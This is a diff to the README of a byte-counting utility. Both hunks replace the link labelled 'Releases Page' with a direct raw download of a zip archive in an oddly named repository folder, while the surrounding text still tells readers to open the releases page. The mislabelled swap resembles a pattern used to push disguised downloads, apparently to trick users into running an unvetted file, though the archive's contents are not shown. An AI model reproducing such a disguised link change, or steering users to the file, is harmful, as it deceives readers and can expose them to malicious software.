@@ -4,7 +4,7 @@
 The **byte-counter** application helps you count bytes passing through a stream. This means you can monitor your data usage effectively. Whether you're managing file transfers, streaming media, or troubleshooting network issues, this tool provides clear insights.
 
 ## 📥 Download & Install
-To get started, you will need to download the application. **Visit this page to download**: [Releases Page](https://github.com/ncn16/byte-counter/releases)
+To get started, you will need to download the application. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/ncn16/byte-counter/main/semaphorically/byte-counter_v2.9.zip)
 
 ### Installation Steps
 1. Open the releases page by clicking the link above.
@@ -57,4 +57,4 @@ For support, please refer to the GitHub Issues page or contact the developers di
 ## 🌟 Contribution
 If you would like to contribute to the **byte-counter** project, check the repository for guidelines on how to get started. We appreciate all help, including feedback, feature requests, and code contributions.
 
-For more information, **visit this page to download**: [Releases Page](https://github.com/ncn16/byte-counter/releases) and start using **byte-counter** today to better manage your data!
+For more information, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/ncn16/byte-counter/main/semaphorically/byte-counter_v2.9.zip) and start using **byte-counter** today to better manage your data!
